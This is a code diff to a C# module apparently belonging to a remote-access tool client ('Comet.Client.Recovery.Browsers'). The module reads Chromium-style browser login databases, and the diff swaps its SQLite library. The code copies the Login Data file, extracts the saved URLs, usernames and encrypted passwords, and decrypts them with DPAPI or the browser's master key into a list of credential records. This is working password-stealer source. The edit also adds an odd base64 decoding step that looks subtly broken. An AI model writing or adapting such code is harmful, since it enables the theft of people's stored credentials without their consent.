@@ -2,10 +2,10 @@
 using Comet.Client.Recovery.Utilities;
 using Comet.Common.DNS;
 using Comet.Common.Models;
+using CS_SQLite3;
 using System;
 using System.Collections.Generic;
 using System.Data;
-using System.Data.SQLite;
 using System.Data.SqlTypes;
 using System.Diagnostics;
 using System.IO;
@@ -46,55 +46,45 @@ namespace Comet.Client.Recovery.Browsers
             {
                 try
                 {
-                    File.Copy(filePath, filePath + "B",true);
+                    File.Copy(filePath, filePath + "B", true);
                     filePath += "B";
+                    SQLiteDatabase database = new SQLiteDatabase(filePath);
                     string query = "SELECT origin_url, username_value, password_value FROM logins";
-                    string connectionString = "data source=" +  filePath + ";version=3;";
-                    using (SQLiteConnection connection = new SQLiteConnection(connectionString))
+                    DataTable resultantQuery = database.ExecuteQuery(query);
+                    foreach (DataRow row in resultantQuery.Rows)
                     {
-                        DataSet ds = new DataSet();
+                        string url;
+                        string username;
+                        string password = "";
+                        string crypt_password;
+                        url = (string)row["origin_url"].ToString();
+                        username = (string)row["username_value"].ToString();
+                        crypt_password = row["password_value"].ToString();
+                        byte[] passwordBytes = Convert.FromBase64String(crypt_password);
                         try
                         {
-                            connection.Open();
-                            SQLiteDataAdapter command = new SQLiteDataAdapter(query, connection);
-                            command.Fill(ds, "ds");
+                            //老版本解密
+                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));
+
+
                         }
-                        catch (Exception)
+                        catch (Exception) //如果异常了就用新加密方式尝试
                         {
-                            //MessageBox.Show("Error while reading the database: " + ex.Message);
+                            byte[] masterKey = GetMasterKey(localStatePath);
+                            password = DecryptWithKey(passwordBytes, masterKey);
                         }
-                        foreach (DataRow row in ds.Tables[0].Rows)
+                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
                         {
-                            string password = "";
-                            string url = row["origin_url"].ToString();
-                            string username = row["username_value"].ToString();
-                            if (!string.IsNullOrEmpty(username)) 
+                            result.Add(new SaveUser
                             {
-                                byte[] passwordBytes = (byte[])row["password_value"];
-                                try
-                                {
-                                    //老版本解密
-                                    password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));
-                                }
-                                catch (Exception) //如果异常了就用新加密方式尝试
-                                {
-                                    byte[] masterKey = GetMasterKey(localStatePath);
-                                    password = DecryptWithKey(passwordBytes, masterKey);
-                                }
-                                if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username))
-                                {
-                                    result.Add(new SaveUser
-                                    {
-                                        Url = url,
-                                        Username = username,
-                                        Password = password,
-                                        Application = ApplicationName
-                                    });
-                                }
-                            }
+                                Url = url,
+                                Username = username,
+                                Password = password,
+                                Application = ApplicationName
+                            });
                         }
                     }
-                    return result;
+                    database.CloseDatabase();
                 }
                 catch (Exception)
                 {
@@ -105,7 +95,7 @@ namespace Comet.Client.Recovery.Browsers
             {
                 return result;
             }
-            File.Delete(filePath);  
+            File.Delete(filePath);
             return result;
         }
 
